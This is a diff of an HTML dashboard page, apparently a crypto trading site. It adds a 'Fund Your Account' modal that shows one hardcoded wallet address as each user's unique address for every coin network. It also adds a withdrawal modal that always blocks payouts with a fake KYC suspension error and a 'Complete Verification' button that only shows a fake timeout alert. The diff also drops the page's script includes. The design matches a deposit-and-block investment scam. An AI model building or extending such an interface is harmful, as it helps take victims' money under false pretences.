@@ -45,10 +45,54 @@
                 <canvas id="LivePerformanceChart"></canvas>
             </div>
         </div>
-    </main>
-<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    
-    <script src="app.js"></script>
+    <div id="depositModal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(15, 23, 42, 0.85); display: none; justify-content: center; align-items: center; z-index: 9999; backdrop-filter: blur(4px); font-family: sans-serif;">
+    <div style="background-color: #1e293b; border: 1px solid #334155; padding: 24px; border-radius: 12px; width: 90%; max-width: 440px; color: #f8fafc; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); position: relative;">
+        
+        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
+            <h3 style="margin: 0; font-size: 18px; font-weight: 700; letter-spacing: 0.5px;">Fund Your Account</h3>
+            <button onclick="closeDepositModal()" style="background: none; border: none; color: #94a3b8; font-size: 22px; cursor: pointer; line-height: 1;">&times;</button>
+        </div>
+
+        <div style="margin-bottom: 20px;">
+            <label style="font-size: 11px; color: #94a3b8; text-transform: uppercase; font-weight: 600; display: block; margin-bottom: 8px;">Selected Network</label>
+            <div style="position: relative;">
+                <select id="coinSelector" onchange="switchCryptoNetwork(this.value)" style="width: 100%; background-color: #0f172a; border: 1px solid #334155; color: #10b981; padding: 12px; border-radius: 8px; font-weight: 600; font-size: 14px; appearance: none; -webkit-appearance: none; cursor: pointer;">
+                    <option value="USDT (TRC20)">USDT (TRC20 Stablecoin)</option>
+                    <option value="Bitcoin (BTC Mainnet)">Bitcoin (BTC Mainnet)</option>
+                    <option value="Ethereum (ETH ERC20)">Ethereum (ETH ERC20)</option>
+                </select>
+                <span style="position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: #64748b; pointer-events: none; font-size: 12px;">▼</span>
+            </div>
+        </div>
+
+        <div style="margin-bottom: 8px;">
+            <label style="font-size: 11px; color: #94a3b8; text-transform: uppercase; font-weight: 600; display: block; margin-bottom: 8px;">Your Unique Receiving Address</label>
+            <div style="background-color: #0f172a; border: 1px solid #22c55e; padding: 14px; border-radius: 8px; word-break: break-all; font-family: monospace; font-size: 13px; color: #f8fafc; text-align: center; letter-spacing: 0.5px;" id="walletAddressBox">
+                0x71C2496E7278274d3b4614a420971a9E3a9411bb
+            </div>
+        </div>
+        
+        <p style="font-size: 11px; color: #64748b; text-align: center; margin-top: 16px; margin-bottom: 0;">System will credit balances immediately following 3 blockchain network confirmations.</p>
+    </div>
+</div>
+
+<div id="withdrawModal" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: rgba(15, 23, 42, 0.85); display: none; justify-content: center; align-items: center; z-index: 9999; backdrop-filter: blur(4px); font-family: sans-serif;">
+    <div style="background-color: #1e293b; border: 1px solid #334155; padding: 28px; border-radius: 12px; width: 90%; max-width: 400px; color: #f8fafc; box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5); text-align: center;">
+        <div style="font-size: 44px; margin-bottom: 14px; color: #ef4444;">⚠️</div>
+        <h3 style="margin: 0 0 10px 0; font-size: 20px; font-weight: 700; color: #ef4444;">Verification Required</h3>
+        <p style="font-size: 14px; color: #94a3b8; line-height: 1.5; margin-bottom: 20px;">Your withdrawal profile access is locked. To successfully complete asset distributions, verification protocol must be finalized.</p>
+        
+        <div style="background-color: #0f172a; border: 1px solid #ef4444; padding: 12px; border-radius: 8px; font-size: 12px; color: #fca5a5; text-align: left; margin-bottom: 22px; font-family: monospace; line-height: 1.6;">
+            ERROR_CODE: 0x884F2<br>
+            STATUS: SEC_KYC_SUSPENDED
+        </div>
+
+        <div style="display: flex; gap: 12px;">
+            <button onclick="closeWithdrawModal()" style="flex: 1; background-color: #334155; color: #f8fafc; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Cancel</button>
+            <button onclick="alert('Verification server connection timeout. Please check dashboard access configurations.')" style="flex: 2; background-color: #ef4444; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: 600; cursor: pointer;">Complete Verification</button>
+        </div>
+    </div>
+</div>
 </body>
 </html>
 
